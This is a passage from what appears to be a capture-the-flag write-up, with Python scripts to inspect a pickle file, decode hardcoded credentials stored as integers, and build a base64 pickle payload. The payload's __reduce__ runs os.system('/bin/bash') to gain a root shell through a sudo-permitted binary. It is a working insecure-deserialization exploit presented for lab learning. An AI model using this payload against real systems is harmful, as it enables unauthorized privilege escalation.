**Since it appeared to be a serialized data, I wrote a Python script to load and inspect its contents using the pickle module:**

```
import pickle
import sys
import os

if len(sys.argv) < 2:
   print("Usage: python3 script.py <filename>")
   sys.exit(1)

filename = sys.argv[1]

if not os.path.isfile(filename):
   print(f"Error: File '{filename}' not found.")
   sys.exit(1)

try:
   with open(filename, "rb") as file:
      loaded_data = pickle.load(file)
   print(loaded_data)
except Exception as e:
   print(f"An unexpected error occurred: {e}")
```

<br>

**This script does the following:

    Takes a filename as an argument.
    Checks if the file exists before proceeding.
    Opens the file in binary mode and attempts to deserialize it using pickle.load().
    Prints the extracted data for analysis.

**Here’s the Python script I used to extract hardcoaded creds:**

```
from Crypto.Util.number import long_to_bytes

username_long = 1684630636
password_long = 2457564920124666544827225107428488864802762356

username_bytes = long_to_bytes(username_long)
password_bytes = long_to_bytes(password_long)

username = username_bytes.decode('utf-8', errors='ignore')
password = password_bytes.decode('utf-8', errors='ignore')

print(f"Decrypted Username: {username}")
print(f"Decrypted Password: {password}")
```

**With the information from the LinPEAS output, I decided to leverage the sudo permission that allowed the dill user to run /opt/peak_hill_farm/peak_hill_farm as the root user. Running this command, it seems like the application expected some kind of base64-encoded string to proceed. Here's the python script i used to make base64 payload to become root.**

```
import pickle
import os
import base64

class MaliciousObject(object):
   def __reduce__(self):
      return (os.system, ('/bin/bash', ))

serialized_data = pickle.dumps(MaliciousObject())

encoded_payload = base64.b64encode(serialized_data)

print(encoded_payload)
```
